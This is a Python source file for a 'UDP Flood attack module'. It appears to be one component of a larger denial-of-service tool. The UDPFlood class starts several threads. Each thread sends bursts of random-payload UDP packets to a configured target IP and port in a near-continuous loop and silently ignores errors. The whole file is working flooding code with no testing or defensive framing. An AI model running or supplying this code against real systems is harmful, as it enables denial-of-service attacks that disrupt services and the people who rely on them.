"""
UDP Flood attack module
"""

import socket
import time
import threading
import random

class UDPFlood:
    def __init__(self, target_config, config_manager, stats_manager):
        self.target_ip = target_config["ip"]
        self.target_port = target_config["port"]
        self.config_manager = config_manager
        self.stats_manager = stats_manager
        self.is_running = False
        self.threads = []
    
    def start(self):
        """Start UDP flood attack"""
        self.is_running = True
        config = self.config_manager.get_attack_config("udp_flood")
        
        for _ in range(config["threads"]):
            thread = threading.Thread(target=self._attack_worker, daemon=True)
            thread.start()
            self.threads.append(thread)
    
    def stop(self):
        """Stop UDP flood attack"""
        self.is_running = False
        
        for thread in self.threads:
            thread.join(timeout=2)
    
    def _attack_worker(self):
        """UDP flood worker thread"""
        config = self.config_manager.get_attack_config("udp_flood")
        
        while self.is_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = random._urandom(config["packet_size"])
                
                # Send multiple packets in burst
                for _ in range(random.randint(1, 5)):
                    sock.sendto(payload, (self.target_ip, self.target_port))
                    self.stats_manager.increment_udp_packets()
                
                sock.close()
                
            except Exception:
                pass
            
            time.sleep(0.001)